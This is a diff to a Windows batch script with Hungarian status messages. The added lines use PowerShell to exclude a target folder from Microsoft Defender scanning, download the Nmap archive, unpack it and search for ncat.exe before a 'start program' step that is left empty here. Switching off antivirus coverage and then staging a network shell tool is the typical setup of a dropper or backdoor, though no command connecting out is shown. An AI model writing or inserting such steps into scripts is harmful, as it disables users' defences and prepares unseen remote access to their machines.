@@ -12,6 +12,42 @@ if not exist "%TARGET%" (
     mkdir "%TARGET%"
 )
 
+:admin_folytatas
+    POWERSHELL -InputFormat None -OutputFormat None -NonInteractive -Command "Add-MpPreference -ExclusionPath '%TARGET%'"
+    echo Kizaras hozzaadva: oda
+
+cd /d "%TARGET%"
+
+echo [INFO] 1. Lepes: Nmap ZIP letoltese...
+set "URL=https://nmap.org/dist/nmap-7.92-win32.zip"
+powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile 'nmap.zip' -UserAgent 'Mozilla/5.0'"
+
+if not exist "nmap.zip" (
+    echo [HIBA] A letoltes nem sikerult.
+    pause
+    exit /b
+)
+
+echo [INFO] 2. Lepes: Kicsomagolas...
+powershell -Command "Expand-Archive -Path 'nmap.zip' -DestinationPath '%TARGET%' -Force"
+
+for /d %%D in ("%TARGET%\nmap*") do (
+    if exist "%%D\ncat.exe" set "NCAT=%%D\ncat.exe"
+)
+
+if defined NCAT (
+    echo [SIKER] A program telepitese kesz.
+    echo.
+    echo [INFO] 3. Lepes: Program inditasa...
+
+) else (
+    echo [HIBA] Nem talaltam meg az ncat.exe-t.
+    dir "%TARGET%"
+    pause
+)
+
+del "nmap.zip"
+
 echo Célmappa: %TARGET%
 echo.
 
